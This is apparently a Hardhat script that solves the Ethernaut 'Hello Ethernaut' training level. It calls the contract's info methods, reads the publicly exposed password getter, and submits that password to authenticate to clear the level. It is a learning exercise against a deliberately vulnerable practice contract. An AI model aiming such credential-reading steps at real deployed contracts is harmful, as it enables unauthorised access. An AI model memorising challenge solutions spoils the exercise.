import { ethers } from "hardhat";

const attackDoubleEntry = async () => {
    // change contract addresses here.
    const helloEthernautAddress = process.env.HELLOETHERNAUT!; //type "await contract.address()" in ethernaut console

    // Don't touch below 🚀
    // Vulnerability from public view of password
    // typing all commands in console below
    // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
    const ABI = [
        {
            inputs: [{ internalType: "string", name: "_password", type: "string" }],
            stateMutability: "nonpayable",
            type: "constructor",
            constant: undefined,
            payable: undefined,
        },
        {
            inputs: [{ internalType: "string", name: "passkey", type: "string" }],
            name: "authenticate",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [],
            name: "getCleared",
            outputs: [{ internalType: "bool", name: "", type: "bool" }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [],
            name: "info",
            outputs: [{ internalType: "string", name: "", type: "string" }],
            stateMutability: "pure",
            type: "function",
        },
        {
            inputs: [],
            name: "info1",
            outputs: [{ internalType: "string", name: "", type: "string" }],
            stateMutability: "pure",
            type: "function",
        },
        {
            inputs: [{ internalType: "string", name: "param", type: "string" }],
            name: "info2",
            outputs: [{ internalType: "string", name: "", type: "string" }],
            stateMutability: "pure",
            type: "function",
        },
        {
            inputs: [],
            name: "info42",
            outputs: [{ internalType: "string", name: "", type: "string" }],
            stateMutability: "pure",
            type: "function",
        },
        {
            constant: true,
            inputs: [],
            name: "infoNum",
            outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
            payable: undefined,
            signature: "0xc253aebe",
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [],
            name: "method7123949",
            outputs: [{ internalType: "string", name: "", type: "string" }],
            stateMutability: "pure",
            type: "function",
        },
        {
            inputs: [],
            name: "password",
            outputs: [{ internalType: "string", name: "", type: "string" }],
            payable: undefined,
            signature: "0x224b610b",
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [],
            name: "theMethodName",
            outputs: [{ internalType: "string", name: "", type: "string" }],
            stateMutability: "view",
            type: "function",
        },
    ];
    const contract = await ethers.getContractAt(ABI, helloEthernautAddress);
    const tx1 = await contract.info();
    console.log(tx1);
    const tx2 = await contract.info1();
    console.log(tx2);
    const tx3 = await contract.info2("hello");
    console.log(tx3);
    const tx4 = (await contract.infoNum()).toString();
    console.log(tx4);
    const tx5 = (await contract.info42()).toString();
    console.log(tx5);
    const tx6 = (await contract.theMethodName()).toString();
    console.log(tx6);
    const tx7 = (await contract.method7123949()).toString();
    console.log(tx7);
    const tx8 = (await contract.password()).toString();
    console.log(tx8);
    const tx9 = await contract.authenticate(tx8);
    console.log(tx9);
    const tx10 = await contract.getCleared();
    console.log(`Passed this level: ${tx10}`);
    if (tx10) {
        console.log("Level Passed! You may submit to ethernaut.");
    } else {
        console.log("Please review code above and try again...");
    }
};

attackDoubleEntry()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
